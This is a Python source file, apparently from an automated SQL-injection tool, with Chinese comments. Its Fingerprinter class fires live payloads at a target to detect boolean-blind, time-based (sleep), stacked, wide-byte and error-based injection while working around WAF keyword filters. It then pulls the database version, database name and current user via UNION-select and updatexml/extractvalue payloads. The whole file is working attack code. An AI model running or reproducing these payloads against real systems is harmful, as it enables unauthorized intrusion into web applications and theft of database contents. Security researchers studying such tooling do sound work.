"""注入类型识别：回显 / 报错 / 布尔 / 时间 / 堆叠 / 宽字节 + 版本探测。"""
from __future__ import annotations

import re
from typing import Optional

from .builder import PayloadBuilder
from .models import Fingerprint, InjectionPoint, ResponseInfo, similarity
from .session import HttpSession
from ..tampers import apply_form


class Fingerprinter:
    def __init__(self, session: HttpSession, injection: InjectionPoint,
                 R_err: Optional[ResponseInfo] = None,
                 builder: Optional[PayloadBuilder] = None):
        self.s = session
        self.inj = injection
        self.log = session.log
        self.R_err = R_err
        self.b = builder

    def _pre(self) -> str:
        return self.inj.base_value if self.inj.numeric \
            else self.inj.base_value + self.inj.closure

    def _tail(self) -> str:
        return self.inj.comment if self.inj.comment != "quote-close" else ""

    def _cond_payload(self, cond: str, joiner: str = "and") -> str:
        """形态感知的布尔条件 payload（builder 可用时走 WAF 感知链）。"""
        fn = self.b.logic_or if joiner == "or" else self.b.logic_and
        if self.b is not None:
            return self.b.wrap(fn(cond))
        return f"{self._pre()}{apply_form(f' {joiner} ({cond})', self.inj.form)}{self._tail()}"

    def run(self, waf) -> Fingerprint:
        fp = Fingerprint()
        fp.error_visible = bool(self.R_err and self.R_err.has_sql_error())
        fp.echo_visible = bool(self.inj.echo_positions)
        notes = []

        # 布尔盲注（or 优先：登录框恒真=成功页；and 兜底：查询框真=基线）
        for joiner in ("or", "and"):
            t = self.s.request_value(self._cond_payload("1=1", joiner))
            f = self.s.request_value(self._cond_payload("1=2", joiner))
            fp.boolean_oracle = (t.status_code > 0 and
                                 (similarity(t, f) < 0.995 or t.status_code != f.status_code))
            if fp.boolean_oracle:
                break

        # 时间盲注
        if not waf.is_filtered("sleep"):
            r = self.s.request_value(self._cond_payload("sleep(3)"))
            fp.time_oracle = r.elapsed_ms >= 2800
        else:
            notes.append("sleep 被过滤，时间盲注判定受限")

        # 堆叠（select 被滤时用 SET @a=sleep 探测，绕开关键字依赖）
        if not waf.is_filtered(";"):
            if not waf.is_filtered("select"):
                core = apply_form(";select sleep(3)", self.inj.form)
                r = self.s.request_value(f"{self._pre()}{core}{self._tail()}")
                fp.stacked = r.elapsed_ms >= 2800 and not r.has_sql_error()
            if not fp.stacked and not waf.is_filtered("sleep"):
                core = apply_form(";SET @a=sleep(3)", self.inj.form)
                r = self.s.request_value(f"{self._pre()}{core}{self._tail()}")
                fp.stacked = r.elapsed_ms >= 2800
            if fp.stacked:
                notes.append("堆叠注入可用（mysqli_multi_query）")
        else:
            notes.append("分号被过滤，堆叠判定受限")

        # 宽字节（引号被处理的场景才有意义）
        if waf.is_filtered("'"):
            r = self.s.request_value(self.inj.base_value + "\xdf'")
            fp.widebyte = r.has_sql_error() or (
                self.R_err is not None and similarity(r, self.R_err) > 0.95)
            if fp.widebyte:
                notes.append("宽字节注入可行（%df 吞掉转义反斜杠）")

        # 版本 / 当前库（快速通道：union 回显 > 报错）
        if fp.echo_visible and not waf.is_filtered("union", "select"):
            self._version_via_union(fp)
        elif fp.error_visible and not waf.is_filtered("updatexml", "extractvalue"):
            self._version_via_error(fp, waf)

        for n in notes:
            self.log("INFO", f"[指纹] {n}")
        self.log("INFO", f"[指纹] {fp.to_dict()}")
        return fp

    # ------------------------------------------------------------------
    def _version_via_union(self, fp: Fingerprint):
        from ..tampers import form_sep
        n = self.inj.column_count or 2
        cols = ["null"] * n
        pos = (self.inj.echo_positions or [1])[0] - 1
        cols[pos] = "concat_ws(0x7e,version(),database(),user())"
        core = apply_form("union select " + ",".join(cols), self.inj.form)
        pre = f"0{self.inj.closure}"
        if not self.inj.closure:
            pre += form_sep(self.inj.form) if self.inj.form != "classic" else " "
        r = self.s.request_value(f"{pre}{core}{self.inj.comment}")
        m = re.search(r"([0-9]+\.[0-9]+\.[0-9]+[^\s~]*)~([^~\s<]+)~([^\s~<]+)", r.body)
        if m:
            fp.version, fp.current_db, fp.current_user = m.group(1), m.group(2), m.group(3)

    def _version_via_error(self, fp: Fingerprint, waf):
        fn = "updatexml" if not waf.is_filtered("updatexml") else "extractvalue"
        payload = (f"{self._pre()} and {fn}(1,concat(0x7e,version(),0x7e),1)"
                   f"{self._tail() if fn == 'updatexml' else ''}")
        if fn == "extractvalue":
            payload = f"{self._pre()} and extractvalue(1,concat(0x7e,version(),0x7e)){self._tail()}"
        r = self.s.request_value(payload)
        m = re.search(r"XPATH syntax error:\s*'~?([^~']+)", r.body)
        if m:
            fp.version = m.group(1)
